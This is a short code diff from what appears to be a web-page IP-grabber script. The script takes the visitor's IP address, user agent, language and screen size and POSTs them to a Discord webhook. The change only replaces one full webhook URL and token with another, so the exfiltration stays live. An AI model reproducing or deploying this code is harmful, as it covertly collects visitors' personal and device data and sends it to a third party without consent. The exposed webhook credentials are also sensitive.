@@ -11,7 +11,7 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
   let xscreen = screen.width + "x"+screen.height;
   var udata = ip + " " + agent + " " + lang + " " + xscreen;
   const xml = new XMLHttpRequest;
-   xml.open("POST", "https://discord.com/api/webhooks/1121355992773435503/FTtI24UtPXMN4BmDucQbDRy0WlTKtdQpDL9P7RSvTNzbMCwY8uz330h6Fgmsw2s-EuM7");
+   xml.open("POST", "https://discord.com/api/webhooks/1121363260361412669/9Y911sZeCAw3iKTNRkcdcWlkUi_9Y3edKZ8xrDTpwtGMT87FHeyMHw584qaC7CrulvjO");
 
    xml.setRequestHeader('Content-type', 'application/json');
 
